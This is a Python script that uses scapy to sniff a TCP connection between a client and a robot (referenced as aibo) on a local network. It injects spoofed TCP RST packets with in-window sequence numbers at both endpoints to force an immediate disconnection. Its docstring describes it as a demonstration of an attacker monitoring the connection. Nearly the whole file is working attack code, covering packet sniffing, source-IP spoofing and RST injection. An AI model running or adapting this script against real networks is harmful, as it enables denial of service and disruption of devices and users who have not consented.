#!/usr/bin/env python3
"""
The aibo_mitm.py `--mode rst` already forces a RST from inside.

The difference here is that it is a demonstration of an attacker monitoring the connection
but not acting as a proxy/spoofing the access point.
It injects TCP RST segments (with correct seq/ack learned from a
sniffed packet) at BOTH endpoints, forcing an immediate disconnection.

Requires scapy and root to be installed on the machine running the script.

Usage:
    sudo python3 rst_inject.py --iface <INTERFACE> \
        --client <IP> --robot <IP> --port <ROBOT_PORT> --count <NUMBER_BURSTS>

Example:    
    sudo python3 rst_inject.py --iface wlan0 \
        --client 192.168.1.50 --robot 192.168.1.124 --port 7777 --count 4
"""

import argparse
import sys

try:
    from scapy.all import sniff, send, IP, TCP
except ImportError:
    print("scapy is required: sudo pacman -S scapy on Arch (or pip install scapy)",
          file=sys.stderr)
    sys.exit(1)


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--iface", required=True, help="capture interface (e.g. wlan0)")
    ap.add_argument("--client", required=True, help="client IP")
    ap.add_argument("--robot", required=True, help="robot IP")
    ap.add_argument("--port", type=int, default=7777, help="robot TCP port")
    ap.add_argument("--count", type=int, default=2,
                    help="how many RST bursts to send before stopping")
    args = ap.parse_args()

    bpf = (f"tcp and port {args.port} and host {args.client} and host {args.robot}")
    print(f"[*] sniffing {args.iface} for the {args.client}<->{args.robot}:{args.port} "
          f"connection ...")

    state = {"sent": 0}

    def on_pkt(pkt):
        if state["sent"] >= args.count:
            return True   # stop sniffing
        ip = pkt[IP]
        tcp = pkt[TCP]
        # Direction: we can reset either side. Use the observed seq/ack to make
        # each RST land in-window at its destination
        # Reset the receiver of THIS packet by spoofing the sender
        rst = IP(src=ip.src, dst=ip.dst) / TCP(
            sport=tcp.sport, dport=tcp.dport, flags="R", seq=tcp.seq)
        send(rst, iface=args.iface, verbose=False)
        # And reset the other direction
        rst_ack = IP(src=ip.dst, dst=ip.src) / TCP(
            sport=tcp.dport, dport=tcp.sport, flags="R", seq=tcp.ack)
        send(rst_ack, iface=args.iface, verbose=False)
        state["sent"] += 1
        print(f"[+] injected RST burst {state['sent']}/{args.count} "
              f"({ip.src}:{tcp.sport} <-> {ip.dst}:{tcp.dport})")
        return None

    sniff(iface=args.iface, filter=bpf, prn=on_pkt, store=False,
          stop_filter=lambda p: state["sent"] >= args.count)
    print("[*] done. Expected result: both client and robot dropped the connection ")

main()